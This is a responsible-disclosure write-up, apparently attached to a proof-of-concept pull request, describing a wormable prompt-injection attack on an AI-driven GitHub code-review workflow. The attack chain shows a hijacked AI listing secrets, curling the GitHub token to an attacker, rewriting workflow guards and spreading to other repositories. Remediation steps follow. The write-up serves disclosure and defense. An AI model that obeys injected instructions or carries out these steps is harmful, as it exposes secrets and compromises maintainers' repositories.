# Security Demo: AI Code Review Worm (Prompt Injection via `pull_request_target`)

**Do not merge this PR.** This is a responsible-disclosure proof-of-concept demonstrating a **wormable prompt injection attack** against the `qwen-code-pr-review.yml` workflow.

## The Vulnerability

The workflow at `.github/workflows/qwen-code-pr-review.yml` combines four conditions that create an RCE chain:

| Condition                              | Line(s)  | Risk                                                       |
| -------------------------------------- | -------- | ---------------------------------------------------------- |
| `pull_request_target` trigger          | L4       | Workflow runs in base repo context with full secret access |
| PR code checkout (no ref pin)          | L50-53   | Attacker-controlled files land on the runner               |
| AI reads PR diff/files via shell       | L131-132 | Prompt injection payload enters the model's context        |
| `sandbox: false` + `run_shell_command` | L115-119 | Hijacked AI executes arbitrary commands on the runner      |

## Attack Chain (Step by Step)

```
1. Attacker opens fork PR with a file containing prompt injection
2. Collaborator submits any review containing "@qwen /review"
   (even "LGTM @qwen /review" is enough)
3. pull_request_review event fires → workflow checks collaborator
   → PASS (review author is collaborator)
4. actions/checkout checks out the PR merge commit
   → attacker's files are now on the runner
5. AI runs "gh pr diff $PR_NUMBER" → sees injected instructions
   in the diff output (or "cat filename" on an injected file)
6. Prompt injection hijacks the AI
7. AI uses run_shell_command (@sandbox: false@) to:
   → gh secret list
   → curl $GITHUB_TOKEN to attacker
   → gh api workflows -X PUT (remove collaborator guard)
8. Wormable: now ANY fork PR triggers the compromised workflow
```

## The Wormable Propagation (TanStack/Mistral Pattern)

Once the initial foothold is gained (step 7-8 above), the worm self-propogates:

1. The compromised workflow now processes ALL fork PRs without the collaborator check
2. Each new PR triggers the AI, which reads the attacker's code and gets hijacked
3. The hijacked AI uses `id-token: write` (L46) to mint OIDC tokens for cloud providers
4. With `pull-requests: write` (L47), the worm comments on other repos' PRs with links
   containing secondary payloads, spreading to other projects
5. The `$GITHUB_TOKEN` has `contents: read` — enough to clone other repos and inject
   similar workflow backdoors

## Proof of Concept (This PR)

This PR contains two files in `docs/security/`:

| File                   | Purpose                                                                                                                          |
| ---------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| `INJECTION_PAYLOAD.md` | Benign prompt injection payload. When the AI reads it (via `gh pr diff` or `cat`) the embedded instructions hijack its behavior. |
| `REVIEW_WORM_DEMO.md`  | This file — full disclosure for maintainers.                                                                                     |

The injection payload instructs the AI to post a single comment with the text `SECURITY DEMO: Prompt injection confirmed.`

**No data is exfiltrated. No files are modified. No tokens are read. No side effects.**

To verify the PoC:

1. A repo collaborator submits any review containing `@qwen /review`
2. The `pull_request_review` event triggers `qwen-code-pr-review.yml` at L8-9
3. The guard at L37-41 passes (review author is a collaborator)
4. `actions/checkout` at L50-53 checks out this PR's merge commit
5. The AI runs `gh pr diff $PR_NUMBER` (L131) and reads this file's diff
6. **If the model is susceptible**, it follows the injected instructions and posts the demo comment
7. **If the model is not susceptible**, the vulnerability still exists — a different model or refined payload would succeed, and the `ADDITIONAL_INSTRUCTIONS` vector (L89, L107, L134-136) is a guaranteed bypass that doesn't depend on model susceptibility

## Remediation

Stop the most dangerous path first:

1. **Remove `pull_request_target` from the review workflow.** Use `pull_request` instead and fetch PR metadata via `gh` API (which is already how the workflow gets PR data).
2. **If `pull_request_target` is unavoidable:** change `actions/checkout` to check out the **base branch**, not the merge commit:
   ```yaml
   - uses: actions/checkout@v4
     with:
       ref: ${{ github.event.pull_request.base.sha }}
   ```
3. **Remove `id-token: write`** from this workflow. The review workflow has no reason to mint OIDC tokens.
4. **Enable sandbox mode:** `"sandbox": true` in the action config (L119). This limits the blast radius of any shell command execution.
5. **Sanitize `ADDITIONAL_INSTRUCTIONS`** (L89, L107, L134-136): do not pass untrusted user text directly into the AI prompt.
6. **Pin `actions/checkout` to a specific commit SHA**, not a mutable tag.

## References

- [CVE-2025-3011: TanStack Supply Chain Compromise](https://nvd.nist.gov/vuln/detail/CVE-2025-3011)
- [GitHub Security Lab: pull_request_target vulnerabilities](https://securitylab.github.com/research/github-actions-untrusted-input/)
- [OWASP Prompt Injection Guide](https://owasp.org/www-project-top-10-for-llm-applications/)
